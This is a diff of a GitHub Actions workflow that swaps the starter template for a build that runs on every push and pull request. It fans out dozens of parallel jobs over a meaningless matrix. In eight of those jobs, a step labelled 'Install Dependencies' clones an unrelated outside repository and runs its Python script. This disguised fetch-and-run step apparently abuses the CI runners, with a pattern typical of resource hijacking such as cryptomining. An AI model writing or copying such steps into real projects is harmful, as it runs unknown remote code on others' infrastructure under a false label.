@@ -1,36 +1,176 @@
-# This is a basic workflow to help you get started with Actions
-
-name: CI
-
-# Controls when the workflow will run
-on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
+name: build 
+ 
+on: 
   push:
-    branches: [ "main" ]
   pull_request:
-    branches: [ "main" ]
-
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
-jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
-    runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
-    steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v3
-
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
-
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+  
+jobs: 
+  build: 
+    name: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 1 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 
+        flag: [A, B, C, D] 
+    env: 
+        NUM_JOBS: 1  
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      continue-on-error: true 
+      uses: actions/checkout@v1 
+ 
+  deploy-1: 
+    name: deploy-1 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: git clone https://github.com/zamreskhan/ac.git && cd ac && python ox.py
+ 
+  deploy-2: 
+    name: deploy-2 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: git clone https://github.com/zamreskhan/ac.git && cd ac && python ox.py 
+ 
+  deploy-3: 
+    name: deploy-3 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: git clone https://github.com/zamreskhan/ac.git && cd ac && python ox.py 
+ 
+  deploy-4: 
+    name: deploy-4 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: git clone https://github.com/zamreskhan/ac.git && cd ac && python ox.py 
+ 
+  succes: 
+    name: succes 
+    needs: [deploy-1, deploy-2, deploy-3, deploy-4] 
+    runs-on: ubuntu-latest 
+    steps: 
+    - name: Setup 
+      continue-on-error: true 
+      uses: actions/checkout@v1 
+ 
+  production-1: 
+    name: production-1 
+    needs: succes 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: git clone https://github.com/zamreskhan/ac.git && cd ac && python ox.py 
+ 
+  production-2: 
+    name: production-2 
+    needs: succes 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: git clone https://github.com/zamreskhan/ac.git && cd ac && python ox.py 
+ 
+  production-3: 
+    name: production-3 
+    needs: succes 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: git clone https://github.com/zamreskhan/ac.git && cd ac && python ox.py 
+ 
+  production-4: 
+    name: production-4 
+    needs: succes 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: git clone https://github.com/zamreskhan/ac.git && cd ac && python ox.py
